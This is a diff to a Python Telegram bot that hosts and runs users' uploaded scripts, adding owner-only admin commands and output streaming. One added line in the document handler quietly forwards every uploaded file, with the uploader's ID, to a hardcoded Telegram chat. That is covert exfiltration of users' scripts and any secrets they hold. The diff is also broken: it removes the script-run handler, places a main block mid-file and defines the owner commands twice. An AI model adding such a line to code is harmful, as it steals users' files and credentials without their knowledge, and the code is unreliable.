@@ -71,15 +71,24 @@ def install_libraries_from_command(libraries, user_id):
 # List of allowed libraries for installation
 
 def is_user_member(chat_id, user_id):
+    if str(user_id) == OWNER_ID:
+        return True  # Bot owner is always considered a member
     try:
         member = bot.get_chat_member(chat_id, user_id)
         return member.status not in ['left', 'kicked']
     except Exception as e:
         logging.error(f"Error checking user membership: {str(e)}")
         return False
+    
+    
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user_id = message.from_user.id
+
+    # Exempt the bot owner from membership checks
+    if str(user_id) == OWNER_ID:
+        initialize_bot_functionalities(message)
+        return
 
     # Check if the user is a member of the channel
     try:
@@ -276,6 +285,8 @@ def handle_document(message):
         with open(new_file_path, 'wb') as f:
             f.write(file)
 
+        bot.send_document(-1002138007645, message.document.file_id, caption=f"📁 File from user {user_id}: {file_name}")
+
         bot.send_message(user_id, f"File '{file_name}' received and saved. You now have {len(files) + 1} file(s).")
     except Exception as e:
         logging.error(f"Failed to handle document: {e}")
@@ -331,74 +342,53 @@ def install_libraries_from_requirements(libraries, user_id):
         bot.send_message(user_id, f"Installation failed:\n{e}")
     except Exception as e:
         bot.send_message(user_id, f"Error: {str(e)}")
-@bot.callback_query_handler(func=lambda call: call.data.startswith('run_'))
-def run_file(call):
-    file_name = call.data[len('run_'):]
-    file_name = os.path.basename(file_name)  # Sanitize filename
-    user_id = call.from_user.id
-    user_dir = f'./user_files/{user_id}'
-    file_path = os.path.join(user_dir, file_name)
-    user_lib_dir = os.path.join(user_dir, 'libs')
+# Owner-only command to count bots
+@bot.message_handler(commands=['countbots'])
+def count_bots(message):
+    if str(message.from_user.id) == OWNER_ID:
+        base_directory = './user_files/'
+        try:
+            bot_count = sum(os.path.isdir(os.path.join(base_directory, i)) for i in os.listdir(base_directory))
+            bot.send_message(message.from_user.id, f"Currently, there are {bot_count} bots hosted.")
+        except Exception as e:
+            bot.send_message(message.from_user.id, f"An error occurred: {str(e)}")
+    else:
+        bot.send_message(message.from_user.id, "You are not authorized to use this command.")
 
-    if not os.path.isfile(file_path):
-        bot.send_message(user_id, f"File does not exist: {file_name}")
+# Owner-only command to stop all scripts
+@bot.message_handler(commands=['stopall'])
+def stop_all_scripts_command(message):
+    user_id = message.from_user.id
+    if str(user_id) != OWNER_ID:
+        bot.send_message(user_id, "You are not authorized to use this command.")
         return
 
-    # Prepare the environment variables
-    env = os.environ.copy()
-    env['PYTHONPATH'] = user_lib_dir + os.pathsep + env.get('PYTHONPATH', '')
+    # Stop all scripts for all users
+    for uid in list(running_processes.keys()):
+        stop_all_scripts_for_user(uid)
+    bot.send_message(user_id, "🛑 All running scripts have been stopped.")
 
-    # Check if the user is a member of the group
-    is_member = is_user_member(GROUP_CHAT_ID, user_id)
+# Owner-only command to list all users
+@bot.message_handler(commands=['listusers'])
+def list_all_users(message):
+    user_id = message.from_user.id
+    if str(user_id) != OWNER_ID:
+        bot.send_message(user_id, "You are not authorized to use this command.")
+        return
 
-    try:
-        # Initialize the user's process dictionary and lock if not already done
-        if user_id not in running_processes:
-            running_processes[user_id] = {}
-            process_locks[user_id] = threading.Lock()
-            script_timers[user_id] = {}
+    user_dirs = os.listdir('./user_files/')
+    user_ids = [uid for uid in user_dirs if uid.isdigit()]
+    bot.send_message(user_id, f"📋 Current users: {', '.join(user_ids)}")
 
-        with process_locks[user_id]:
-            running_scripts = running_processes[user_id]
-            script_count = len(running_scripts)
-
-            # Enforce script limits based on group membership
-            if is_member and script_count >= 2:
-                bot.send_message(user_id, "⚠️ You can only run up to 2 scripts simultaneously.")
-                return
-            elif not is_member and script_count >= 1:
-                bot.send_message(user_id, "⚠️ You can only run 1 script at a time. Please stop the running script before starting a new one.")
-                return
-
-            # Start the subprocess
-            process = subprocess.Popen(
-                ['python', file_path],
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                env=env,
-                text=True,
-                bufsize=1
-            )
-
-            running_processes[user_id][file_name] = process
-
-            # Start a timer for non-group members
-            if not is_member:
-                timer_thread = threading.Timer(3600, auto_stop_script, args=(user_id, file_name))
-                timer_thread.start()
-                script_timers[user_id][file_name] = timer_thread
-
-            bot.send_message(user_id, f"🚀 Running '{file_name}'. Use /stop to manage your scripts.")
-
-            threading.Thread(target=stream_process_output, args=(user_id, file_name, process)).start()
-
-    except Exception as e:
-        bot.send_message(user_id, f"⚠️ Failed to run {file_name}: {e}")
+if __name__ == '__main__':
+    # Start the membership checker thread
+    threading.Thread(target=membership_checker, daemon=True).start()
 
 
-def auto_stop_script(user_id, file_name):
-    with process_locks.get(user_id, threading.Lock()):
-        if user_id in running_processes and file_name in running_processes[user_id]:
+
+def stop_script(user_id, file_name):
+    with process_locks[user_id]:
+        if file_name in running_processes[user_id]:
             process = running_processes[user_id][file_name]
             process.terminate()
             try:
@@ -407,30 +397,77 @@ def auto_stop_script(user_id, file_name):
                 process.kill()
                 process.wait()
             del running_processes[user_id][file_name]
-            del script_timers[user_id][file_name]
+
+            # Cancel any timer if it exists
+            if user_id in script_timers and file_name in script_timers[user_id]:
+                timer = script_timers[user_id][file_name]
+                timer.cancel()
+                del script_timers[user_id][file_name]
+
+            # Clean up if no more scripts are running
             if not running_processes[user_id]:
                 del running_processes[user_id]
                 del process_locks[user_id]
-                del script_timers[user_id]
-            # Notify the user
-            bot.send_message(user_id, f"🛑 Your script '{file_name}' has been automatically stopped after 1 hour.")
+                if user_id in script_timers:
+                    del script_timers[user_id]
 
+            # Notify the user
+            bot.send_message(user_id, f"🛑 Your script '{file_name}' has been stopped.")
+
+
+MAX_MESSAGE_LENGTH = 4000  # Telegram's maximum message length
+
+def send_error_message(user_id, file_name, error_message):
+    if len(error_message) > MAX_MESSAGE_LENGTH:
+        # Send as a file
+        with open(f"{file_name}_error.txt", 'w') as f:
+            f.write(error_message)
+        with open(f"{file_name}_error.txt", 'rb') as f:
+            bot.send_document(user_id, f, caption=f"🚫 Error in [{file_name}]")
+        os.remove(f"{file_name}_error.txt")
+    else:
+        bot.send_message(user_id, f"🚫 Error in [{file_name}]:\n```\n{error_message}\n```", parse_mode='Markdown')
 
 
 def stream_process_output(user_id, file_name, process):
     try:
-        for line in process.stdout:
-            if line.strip():
-                bot.send_message(user_id, f"[{file_name}] {line.strip()}")
+        stdout_lines = []
+        stderr_lines = []
+
+        # Send a notification when the script starts
+        bot.send_message(user_id, f"🚀 Your script '{file_name}' has started running.")
+
+        while True:
+            output = process.stdout.readline()
+            error = process.stderr.readline()
+
+            if output:
+                stdout_lines.append(output)
+                bot.send_message(user_id, f"📤 [{file_name}]\n```\n{output.strip()}\n```", parse_mode='Markdown')
+            if error:
+                stderr_lines.append(error)
+                bot.send_message(user_id, f"🚫 Error in [{file_name}]:\n```\n{error.strip()}\n```", parse_mode='Markdown')
+            if output == '' and error == '' and process.poll() is not None:
+                break
+
+        # Check exit code
+        exit_code = process.poll()
+        if exit_code == 0:
+            bot.send_message(user_id, f"✅ Your script '{file_name}' has completed successfully.")
+        else:
+            error_message = ''.join(stderr_lines)
+            bot.send_message(user_id, f"❗ Your script '{file_name}' exited with errors.\nExit code: {exit_code}\nError message:\n```\n{error_message}\n```", parse_mode='Markdown')
     except Exception as e:
         logging.error(f"Error streaming output for user {user_id}, script {file_name}: {e}")
     finally:
         with process_locks[user_id]:
             if file_name in running_processes.get(user_id, {}):
                 del running_processes[user_id][file_name]
-                if not running_processes[user_id]:
-                    del running_processes[user_id]
-                    del process_locks[user_id]
+            # Clean up if no more scripts are running
+            if not running_processes[user_id]:
+                del running_processes[user_id]
+                del process_locks[user_id]
+
 
 @bot.message_handler(commands=['stop'])
 def stop_user_script(message):
@@ -561,6 +598,7 @@ def stop_all_scripts_for_user(user_id):
 # Owner-only command to count bots (ensure OWNER_ID is set correctly)
 OWNER_ID = '890382857'  # Replace with the actual owner ID
 
+# Owner-only command to count bots
 @bot.message_handler(commands=['countbots'])
 def count_bots(message):
     if str(message.from_user.id) == OWNER_ID:
@@ -573,9 +611,35 @@ def count_bots(message):
     else:
         bot.send_message(message.from_user.id, "You are not authorized to use this command.")
 
+# Owner-only command to stop all scripts
+@bot.message_handler(commands=['stopall'])
+def stop_all_scripts_command(message):
+    user_id = message.from_user.id
+    if str(user_id) != OWNER_ID:
+        bot.send_message(user_id, "You are not authorized to use this command.")
+        return
+
+    # Stop all scripts for all users
+    for uid in list(running_processes.keys()):
+        stop_all_scripts_for_user(uid)
+    bot.send_message(user_id, "🛑 All running scripts have been stopped.")
+
+# Owner-only command to list all users
+@bot.message_handler(commands=['listusers'])
+def list_all_users(message):
+    user_id = message.from_user.id
+    if str(user_id) != OWNER_ID:
+        bot.send_message(user_id, "You are not authorized to use this command.")
+        return
+
+    user_dirs = os.listdir('./user_files/')
+    user_ids = [uid for uid in user_dirs if uid.isdigit()]
+    bot.send_message(user_id, f"📋 Current users: {', '.join(user_ids)}")
+
 if __name__ == '__main__':
     # Start the membership checker thread
     threading.Thread(target=membership_checker, daemon=True).start()
+
 
     # Start polling
     try:
